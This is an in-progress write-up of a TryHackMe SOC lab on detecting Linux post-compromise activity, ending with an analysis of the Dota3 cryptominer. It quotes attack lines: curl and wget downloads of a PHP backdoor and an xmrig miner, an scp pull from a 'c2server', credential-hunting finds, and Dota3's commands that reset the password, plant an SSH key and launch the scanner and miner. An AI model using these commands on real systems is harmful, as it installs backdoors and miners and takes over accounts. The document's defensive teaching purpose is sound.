---
title: Linux Threat Detection 2
module: Linux Security Monitoring
path: SOC Level 1
platform: TryHackMe
tags: [linux, threat-detection, discovery, ingress-tool-transfer, cryptominer, dota3, auditd, mitre]
status: in-progress
date: 2026-07-01
date_completed:
---

*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*

<p align="center">
<img src=screenshots/linux2_intro.png width="1500">
</p>

---

## Task 1 -- Introduction

### Learning Objectives

What happens after an attacker enters a Linux System?
  - What commands do they run?
  - What is their final goal?
  - How do attackers upload malware onto their targets?

How can SOCs detect their actions, by investigating Discovery commands in logs?

---

## Task 2 -- Discovery Overview

### Discovery

The majority of Linux breaches happen by to be intiated by automated botnets, the attacker is notified, his command center is just the bash.
<p align="center">
<img src=screenshots/linux2_botnet.png width="1500">
</p>

### First Actions

The starting commands attacker use once they have acces to the systems bash are usually the same:
  - Who am I? Where am I? What privileges do I have?
  - Attackers use the same commands IT Teams across the world are constantly using, how do you distinguish?
  - whoami is a command thats always suspisicous
    
| Discovery Goal | Typical Commands |
|---|---|
| OS and Filesystem Discovery | pwd, ls /, env, uname -a, lsb_release -a, hostname |
| User and Groups Discovery | id, whoami, w, last, cat /etc/sudoers, cat /etc/passwd |
| Process and Network Discovery | ps aux, top, ip a, ip r, arp -a, ss -tnlp, netstat -tnlp |
| Cloud or Sandbox Discovery | systemd-detect-virt, lsmod, uptime, pgrep "<edr-or-sandbox>" |

---

1. Run systemd-detect-virt to detect the system's cloud. What is the command's output you discovered?

<p align="center">
<img src=screenshots/linux2_amazon.png width="1500">
</p>
An attacker in **Discovery Phase** will run commands to get a lay of the land, the command: **systemd-detect-virt** , in this case returned Amazon, the attacker is hunting information about the network and its cloud system.

**Answer: Amazon**

---

2. Now run ps aux and look for EDR or antivirus processes. What is the full path to the detected antimalware binary?

<p align="center">
<img src=screenshots/linux2_malscan.png width="1500">
</p>
During the attacker's discovery phase, they need to know which processes are currently running on a system so they can determine what security measures they're up against.

**Answer: /var/lib/ultrasec/malscan**

---

## Task 3 -- Detecting Discovery

### Specialized Discovery

After **Initial Discovery**, attackers can then decide their next move:

| Attack Objectives | Typical Commands |
|---|---|
| Find and steal credentials and other sensitive data | history \| grep pass, find / -name .env, find /home -name id_rsa |
| Identify how suitable the system is for crypto mining | cat /proc/cpuinfo, lscpu \| grep Model, free -m, top, htop |
| Scan the internal network for other future victims | ping <ip>, for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done |



### Detecting Discovery



**Example: Tracing Whoami Origin**
```
ubuntu@thm-vm:~$ ausearch -i -x whoami # Look for a Discovery command like whoami
type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3907 auid=ubuntu uid=ubuntu exe=/usr/bin/whoami

ubuntu@thm-vm:~$ ausearch -i --pid 3898 # Identify its parent process, a lp.sh script
type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/bash /tmp/lp.sh
type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3840 pid=3898 auid=ubuntu uid=ubuntu exe=/usr/bin/bash

ubuntu@thm-vm:~$ ausearch -i --ppid 3898 # Look for other processes created by the lp.sh
[Five more commands like "find /home -name *secret*" confirming the script is malicious]
```



---

1. What is the path of the script that initiated the "hostname" command?

**Answer:**

---

2. What was the last Discovery command launched by the script?

**Answer:**

---

3. Looking at the script content, what's the email of the script author?

**Answer:**

---

## Task 4 -- Motivation for Attacks

### "Hack and Forget" Attacks



### Ingress Tool Transfer

| Command | Usage Example |
|---|---|
| Wget: Download a file from the website | wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz |
| Curl: Make a request to the webpage | curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a" |
| SSH: Transfer a file via SCP or SFTP | scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh |



**Example: Option 1 -- Attacker Connects to Victim**
```
attacker@attack-vm:~$ scp ./malware.sh ubuntu@thm-vm:/tmp
[OK] Connecting to thm-vm machine via SSH...
[OK] Logged in on thm-vm via SSH as "ubuntu"
[OK] File transferred from attack-vm to thm-vm
[OK] Job is done, logging out from thm-vm

# To detect on victim, look for SSH logins in /var/log/auth.log
```

**Example: Option 2 -- Victim Connects to Attacker**
```
ubuntu@thm-vm:~$ scp attacker@attack-vm:./malware.sh /tmp
[OK] Connecting to attack-vm machine via SSH...
[OK] Logged in on attack-vm via SSH as "attacker"
[OK] File transferred from attack-vm to thm-vm
[OK] Job is done, logging out from attack-vm

# To detect on victim, look for "scp" command in Auditd logs
```

### Additional Detection



---

1. From which domain was the Elastic agent downloaded?

**Answer:**

---

2. What is the full path to the downloaded "helper.sh" script?

**Answer:**

---

3. Which of the downloaded files is more likely to be malicious: the one downloaded with curl or wget?

**Answer:**

---

## Task 5 -- Dota3: First Actions

### Dota 3 Malware Analysis



### Initial Access



### Discovery

```bash
# Checks CPU and RAM information
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
lscpu | grep Model
# Unclear purpose
ls -lh $(which ls)
# Generic Discovery
crontab -l
w
uname -m
```

### Persistence

```bash
echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash >> up.txt
cd ~
rm -rf .ssh
mkdir .ssh
# Note the "mdrfckr" comment, unique to this attack
echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys
chmod -R go= ~/.ssh
```



### Detecting the Attack

| Log Source | Description |
|---|---|
| Auth Logs: cat /var/log/auth.log \| grep "Accepted" | Look for successful SSH logins by password from untrusted, external IP addresses |
| Auditd Process Logs: ausearch -i -x [command] | Look for execution of Discovery commands (e.g. uname, lscpu) and trace their origin |



---

1. Which IP address managed to brute-force the exposed SSH?

**Answer:**

---

2. Which command did the attacker use to list the last logged-in users?

**Answer:**

---

3. Which three EDR processes did the attacker look for with "egrep"? Answer Format: Separated by a comma, in alphabetical order.

**Answer:**

---

## Task 6 -- Dota3: Miner Setup

### Cryptominer Setup

**Example: How Threat Actors Transfer Malware**
```
user@bot-1672$ scp dota3.tar.gz ubuntu@victim:/tmp
[OK] Transfered dota3.tar.gz file to the victim
```



```bash
# Prepare a hidden /tmp/.X26-unix folder for malware
cd /tmp
rm -rf .X2*
mkdir .X26-unix
cd .X26-unix
# Unarchive malware to /tmp/.X26-unix/.rsync/c folder
tar xf dota3.tar.gz
sleep 3s
cd /tmp/.X26-unix/.rsync/c
```



```bash
# Scan the internal network with the "tsm" malware
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>1&
sleep 8m
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 >> /dev/null 2>1&
sleep 20m
# Run the actual cryptominer named "initall"
cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
# That's it, Dota3 attack is now completed!
exit 0
```



### Detecting the Attack



---

1. What is the name of the malicious archive that was transferred via SCP?

**Answer:**

---

2. What was the full command line of the cryptominer launch?

**Answer:**

---

3. Which IP address range did the attacker scan for an exposed SSH? Answer Example: 10.0.0.1-10.0.0.126.

**Answer:**

---

## Task 7 -- Conclusion

### Key Takeaways



---

1. Let's move on!

**Answer:**
